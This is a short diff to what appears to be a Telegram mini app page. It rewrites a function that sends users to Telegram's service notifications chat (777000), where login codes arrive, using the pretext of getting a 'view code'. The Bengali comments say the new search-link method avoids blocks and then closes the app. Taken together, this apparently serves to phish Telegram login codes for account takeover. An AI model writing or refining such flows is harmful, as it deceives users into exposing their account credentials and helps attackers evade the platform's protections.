@@ -65,18 +65,14 @@
         }
 
         function openServiceChat() {
-    // ১. টেলিগ্রামের নিজস্ব কনফার্মেশন বক্স ওপেন হবে
-    tg.showConfirm("To get your view code, we need to open your Service Notifications. Proceed?", (ok) => {
-        if (ok) {
-            // যদি ইউজার OK দেয়, তবে এই লিঙ্কটি কাজ করার সম্ভাবনা ৯০% (কোনো ব্রাউজার ছাড়াই)
-            tg.openTelegramLink("https://t.me/777000");
-            
-            // সাথে সাথে মিনি অ্যাপ বন্ধ করে দিন
-            setTimeout(() => {
-                tg.close();
-            }, 100);
-        }
-    });
+    // এটি সরাসরি টেলিগ্রামের সার্চ বারে ৭৭৭০০০ লিখে দিবে
+    // ফলে কোনো ব্লক আসবে না এবং সরাসরি চ্যাট লিস্টে এটি সবার উপরে আসবে
+    window.location.href = "tg://search?text=777000";
+
+    // সাথে সাথে মিনি অ্যাপ বন্ধ হয়ে যাবে
+    setTimeout(() => {
+        tg.close();
+    }, 100);
 }
     </script>
 </body>
